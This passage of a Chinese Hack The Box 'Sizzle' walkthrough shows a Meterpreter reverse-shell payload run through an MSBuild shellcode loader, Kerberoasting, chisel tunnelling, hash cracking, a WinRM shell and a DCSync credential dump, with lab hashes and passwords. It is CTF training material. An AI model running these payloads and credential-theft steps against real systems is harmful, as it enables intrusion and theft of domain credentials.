+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp lhost=10.10.14.5 lport=445 -e x86/shikata_ga_nai -i 100 -f csharp &gt; shellcode.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%883.17.30.png" alt="截屏2021-12-02 下午3.17.30"><br>将下面 xml 文件中的 shellcode 替换成成功生成的 shellcode</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">ToolsVersion</span>=<span class="string">&quot;4.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- This inline task executes shellcode. --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Save This File And Execute The Above Command --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span> </span><br><span class="line">  <span class="comment">&lt;!-- License: BSD 3-Clause --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Target</span> <span class="attr">Name</span>=<span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ClassExample</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">UsingTask</span></span></span><br><span class="line"><span class="tag">    <span class="attr">TaskName</span>=<span class="string">&quot;ClassExample&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">TaskFactory</span>=<span class="string">&quot;CodeTaskFactory&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">AssemblyFile</span>=<span class="string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Task</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">      <span class="tag">&lt;<span class="name">Code</span> <span class="attr">Type</span>=<span class="string">&quot;Class&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;cs&quot;</span>&gt;</span></span><br><span class="line">      &lt;![CDATA[</span><br><span class="line">        using System;</span><br><span class="line">        using System.Runtime.InteropServices;</span><br><span class="line">        using Microsoft.Build.Framework;</span><br><span class="line">        using Microsoft.Build.Utilities;</span><br><span class="line">        public class ClassExample :  Task, ITask</span><br><span class="line">        &#123;         </span><br><span class="line">          private static UInt32 MEM_COMMIT = 0x1000;          </span><br><span class="line">          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          </span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern IntPtr CreateThread(            </span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId           </span><br><span class="line">            );</span><br><span class="line">          [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">            private static extern UInt32 WaitForSingleObject(           </span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );          </span><br><span class="line">          public override bool Execute()</span><br><span class="line">          &#123;</span><br><span class="line">            byte[] shellcode = new byte[195] &#123;</span><br><span class="line">              0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,</span><br><span class="line">              0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,</span><br><span class="line">              0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,</span><br><span class="line">              0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,</span><br><span class="line">              0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,</span><br><span class="line">              0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,</span><br><span class="line">              0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,</span><br><span class="line">              0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,</span><br><span class="line">              0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,</span><br><span class="line">              0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,</span><br><span class="line">              0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,</span><br><span class="line">              0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,</span><br><span class="line">           0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x20,0x63,0x00 &#125;;</span><br><span class="line">              </span><br><span class="line">              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">                MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">              IntPtr hThread = IntPtr.Zero;</span><br><span class="line">              UInt32 threadId = 0;</span><br><span class="line">              IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">              WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">              return true;</span><br><span class="line">          &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">      ]]&gt;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">Code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Task</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">UsingTask</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将其命名为 meterpreter.csproj 并上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iwr -uri http://10.10.14.3/meterpreter.csproj -outfile mac.csproj</span><br></pre></td></tr></table></figure>
+
+<p>在本地使用 msf 开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.14.3</span><br><span class="line">msf &gt; <span class="built_in">set</span> lport 445</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p>然后在靶机中通过 msbuild 运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy mac.csproj c:\windows\system32\spool\drivers\color\</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe c:\windows\system32\spool\drivers\color\mac.csproj</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%883.07.10.png" alt="截屏2021-12-02 下午3.07.10"><br>但是未获得 msf 会话，猜测应该是没绕过 AV 限制</p>
+<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>在新的会话中查看端口开放情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%883.28.44.png" alt="截屏2021-12-01 下午3.28.44"><br>在其中发现了nmap扫描未发现的88端口，说明该端口可能已被防火墙屏蔽。而目前我们能够访问到本地88端口，因此可使用 Kerberoast，可通过以下几种方法来获取 Kerberoast</p>
+<h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>借助 Rubeus 可获取 Kerberoast，该工具需要自己来编译 C# 文件来生成 exe<br><em><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></strong></em></p>
+<p>将其上传至靶机的<code>\users\amanda\appdata\local\temp\</code>目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.3/Rubeus.exe -outfile Rubeus.exe</span><br></pre></td></tr></table></figure>
+<p>运行命令即可获取到对应的 NTML 哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</span><br></pre></td></tr></table></figure>
+
+<h4 id="Chisel转发"><a href="#Chisel转发" class="headerlink" title="Chisel转发"></a>Chisel转发</h4><p>使用 Chisel 这个工具能够帮助我们完成端口转发<br><em><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></strong></em></p>
+<p>首先在靶机中下载该程序，并通过它将本地88端口和389端口转发至本地8008端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.3/chisel_1.7.6_windows_amd64.exe -outfile chisel.exe</span><br><span class="line"><span class="built_in">cd</span> c:\Windows\temp\</span><br><span class="line">copy \users\amanda\appdata\<span class="built_in">local</span>\temp\chisel.exe c:\windows\system32\spool\drivers\color\chisel.exe</span><br><span class="line">.\chisel.exe client 10.10.14.3:8008 R:88:127.0.0.1:88 R:389:localhost:389</span><br></pre></td></tr></table></figure>
+<p>在本地将 chisel 反弹的8008端口作为服务端用于访问目标的88端口和389端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 8008 --reverse</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%883.52.12.png" alt="截屏2021-12-02 下午3.52.12"><br>使用 GetUserSPNs.py 能够获取 kerberoast</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.00.08.png" alt="截屏2021-12-02 下午4.00.08"><br>需要注意的是如果要使 kerberos 工作，操作时间必须在五分钟之内，否则无法获取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.01.42.png" alt="截屏2021-12-02 下午4.01.42"></p>
+<h3 id="NTLM哈希破解"><a href="#NTLM哈希破解" class="headerlink" title="NTLM哈希破解"></a>NTLM哈希破解</h3><p>为了破解 NTLM v2 哈希值，我们首先要将哈希值写入<code>mrlky.ntlm</code>当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*mrlky<span class="variable">$HTB</span>.LOCAL<span class="variable">$htb</span>.<span class="built_in">local</span>/mrlky*$a0834969ff71ab60cdf6a4b2dc293533<span class="variable">$34a0be7356e57394ebe0597ef28adb9d9b1e3b05853909590f8bdfab9b3c18d75c92ee9ae63d7678851586ea7277cfc253a529c272976abc2f8d07a05afff45b36415f2bc15aefc54a5fe9b0837a31adaba1a2117d9c3ee155c2dfed1f2df912eac9f1bc76d726914fed25c5a15948bdc101de78b6bce338fadad10695a364ed5d4f70ee5aa4d1a7f1f5a5ad59118d19075071aa0b61c387677a4eca0ea59c1addae5f3c5bee3cffa58e510d89fba3f24e566773abd85198870ac8dc2a4f7f9a2bc5a39cc5b060149c7129829bfddb51d5c80f5964e047bd375d69a8a42d0c562a59024f666d489ee281f3ec9b254e008e3c8e821d6f26654a7fecba109dbb4a7ae4e5da905d2e1d06b47591df0e15ef46ce11576ca206291f8ee4319daf8a7cf9f3c36eee10db84bde838c8e44991a2fe888087ca0778863592eaab06bd7d44972430ad0426e5a4127db08f8f642e8bd9b211336fc7447fd3fad88dc8d120501454c8149464aca470d47892e8196d81e3fa8f090142abea97ac037a27ae2e359cadbaab9ef0551d6ac9bfd490a91af62ff5b11e5df756ad70a874f2037715aabb11d19561872a9867d859fecde373115d8f1bd7d7264277a8621e08ef273d984c396342b68eebae52604828e5a6ec28cd8d772732122d216c46c0184b5bb6c60a9d6fa8fd10a5f4077abb78c927f59bcb833d037a2502809b11a23d5216bda03e8f29d4e5915a82cd8c96fe75cfa7c2b0562bfd77575ca02c170361efd9f1016b6457d365c6b1bab3edce635cf20a8c9edab1d9f9a4dde1d5c65a482fea3279805bb8c99069209772b05872588bc5b245bab073015532966b1e78eb5b8913d84dce8a3188e7b5f2bbf2bd73db95238fb3155e97fdf98c1cf4f43d28fa4ae8799f699a1eb4d9ec958cf3c5a1c72679f0c3a53e1d94bda3138251ca0d74bb8061032b3ee78c27f8722863f83e2d59568739378ef646710b4d12c6d65d18dd8eef91e56aec74647c5fd378096a8602f7647f36f6410529a4dd038842d6cc9434a71c76dc0c711d10198464bae92490cc3a3a0e74a88a1d6c3537b7252974d2fdf627e0db9972390402a05c7169267fc2757e58d8d29e0345b8737eedb7cd16516790e89882c2145040789d9690074cac529f8afa68ebe3b6a6509bf902a640c951b09acee2f03ba14d057326c25dd476c20d635f5fc53501cb37fe27c01c30c1c581301ca121bab48cea7683499de297073ad650e9c0e70c89</span></span><br></pre></td></tr></table></figure>
+<p>使用 hashcat 进行破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 mrlky.ntlm /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.10.43.png" alt="截屏2021-12-02 下午4.10.43"><br>成功拿到密码为<code>Football#7</code></p>
+<h3 id="WinRM登陆-1"><a href="#WinRM登陆-1" class="headerlink" title="WinRM登陆"></a>WinRM登陆</h3><p>使用 openssl 再次生成密钥（key）和证书签名请求（csr）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.14.33.png" alt="截屏2021-12-02 下午4.14.33"><br>与之前一样登录 mrlky 账户，生成证书后将证书移至本目录下并重命名为 amanda.cer</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv ~/Downloads/certnew.cer mrlky.cer</span><br></pre></td></tr></table></figure>
+<p>修改 WinRM 登陆脚本如下</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;winrm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new( </span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">&#x27;https://10.10.10.103:5986/wsman&#x27;</span>,</span><br><span class="line">  <span class="symbol">transport:</span> <span class="symbol">:ssl</span>,</span><br><span class="line">  <span class="symbol">client_cert:</span> <span class="string">&#x27;/root/hackthebox/Machines/Sizzle/cert/mrlky.cer&#x27;</span>,</span><br><span class="line">  <span class="symbol">client_key:</span> <span class="string">&#x27;/root/hackthebox/Machines/Sizzle/cert/mrlky.key&#x27;</span>,</span><br><span class="line">  <span class="symbol">:no_ssl_peer_verification</span> =&gt; <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">&quot;exit\n&quot;</span> <span class="keyword">do</span></span><br><span class="line">        output = shell.run(<span class="string">&quot;-join($id,&#x27;PS &#x27;,$(whoami),&#x27;@&#x27;,$env:computername,&#x27; &#x27;,$((gi $pwd).Name),&#x27;&gt; &#x27;)&quot;</span>)</span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = gets        </span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span>    </span><br><span class="line">    puts <span class="string">&quot;Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>执行后成功通过 WinRM 获得 mrlky 权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%884.38.55.png" alt="截屏2021-12-02 下午4.38.55"></p>
+<h2 id="0x04-权限提升-administrator"><a href="#0x04-权限提升-administrator" class="headerlink" title="0x04 权限提升[administrator]"></a>0x04 权限提升[administrator]</h2><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>使用 Bloodhound 可了解该主机中其他用户拥有何种权限<br><em><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3">https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3</a></strong></em><br>通过 smb 服务上传 bloodhound，与此同时运行 smbserver 开启 smb 服务<br>需要注意的是由于靶机中不允许连接未经身份认证的共享，所以我们需要设置账号密码来进行身份验证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -smb2support mac . -username mac -password mac</span><br></pre></td></tr></table></figure>
+
+<p>连接共享后将 Bloodhound 上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.14.5\mac\ /u:mac mac</span><br><span class="line">copy BloodHound.zip \\10.10.14.5\mac\</span><br></pre></td></tr></table></figure>
+<p>在本地查看 bloodhound 中的节点信息，其中显示它拥有 GetChangesALL 权限，这也就意味着我可以进行 dcsync 攻击，最终通过 secretsdump 来获取管理员的哈希值</p>
+<h3 id="尝试哈希破解"><a href="#尝试哈希破解" class="headerlink" title="尝试哈希破解"></a>尝试哈希破解</h3><p>意外<code>C:\Windows\system32</code>目录下存在<code>file.txt</code>，其中包含多个用户的哈希值<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%884.40.38.png" alt="截屏2021-12-01 下午4.40.38"><br>在其中存在用户 mrlky 和管理员的哈希值</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::</span></span><br><span class="line"><span class="attr">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::</span></span><br></pre></td></tr></table></figure>
+<p>使用 john 进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -format=NT --wordlist=/usr/share/wordlists/rockyou.txt mrlky.hash</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2b6b41bb/%E6%88%AA%E5%B1%8F2021-12-01%20%E4%B8%8B%E5%8D%885.41.56.png" alt="截屏2021-12-01 下午5.41.56"><br>成功拿到用户 mrlky 的密码为<code>Football#7</code>，但是没拿到管理员的密码</p>
+<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><blockquote>
+<p>DCSync可从利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据 </p>
+</blockquote>
+<p><strong>DCSync参考文章：<a target="_blank" rel="noopener" href="https://yojimbosecurity.ninja/dcsync/">https://yojimbosecurity.ninja/dcsync/</a></strong><br>使用 secretsdump.py 成功获取管理员用户凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py sizzle.htb.local/mrlky:Football<span class="comment">#7@sizzle.htb.local</span></span><br></pre></td></tr></table></figure>
